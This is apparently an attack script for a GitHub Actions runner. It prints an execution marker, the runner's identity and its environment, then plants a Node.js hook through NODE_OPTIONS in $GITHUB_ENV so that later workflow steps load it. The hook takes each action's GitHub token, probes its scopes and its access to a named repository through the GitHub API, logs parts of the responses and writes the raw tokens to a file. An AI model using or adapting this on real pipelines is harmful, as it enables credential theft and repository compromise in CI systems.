#!/bin/bash
set -u
echo "RCE-MARKER job=$GITHUB_JOB run=$GITHUB_RUN_ID action=$GITHUB_ACTION"
id
hostname || true
echo "--- env-filtered ---"
env | sort | grep -v -i -E 'token|secret|password|key|auth' | head -60
echo "--- workspace ---"
pwd; ls -la
cat > /tmp/nh.js <<'JSEOF'
try {
  var cp=require('child_process'), fs=require('fs');
  var t=process.env.INPUT_TOKEN||process.env.INPUT_GITHUB_TOKEN||'';
  var act=(process.env.GITHUB_ACTION||'?');
  function run(c){try{return cp.execSync(c,{encoding:'utf8',timeout:30000})}catch(e){return 'EXEC_ERR:'+(e.stdout||'')+(e.stderr||'')}}
  if (t) {
    var h='-H "Authorization: Bearer '+t+'" -H "User-Agent: omp"';
    var user=run('curl -sS -D /tmp/hdr -w "\\nHTTP:%{http_code}" '+h+' https://api.github.com/user');
    var hdr=run('grep -i -E "HTTP/|x-oauth-scopes|x-accepted" /tmp/hdr');
    var rep=run('curl -sS -w "\\nHTTP:%{http_code}" '+h+' https://api.github.com/repos/PDFtoMark/triage-bgd-labs-v1605241-0a3e51');
    console.log('TOKHOOK action='+act+' len='+t.length);
    console.log('TOKHOOK_HDR '+String(hdr).replace(/\n/g,' | '));
    console.log('TOKHOOK_USER '+String(user).slice(0,300).replace(/\n/g,' | '));
    console.log('TOKHOOK_REPO '+String(rep).slice(0,400).replace(/\n/g,' | '));
    fs.appendFileSync('/tmp/tokdump.txt', act+'\t'+t+'\n');
  }
} catch(e) { console.log('TOKHOOK_ERR '+e.message); }
JSEOF
printf 'NODE_OPTIONS=--require /tmp/nh.js\n' >> "$GITHUB_ENV"
echo "hook installed at /tmp/nh.js"
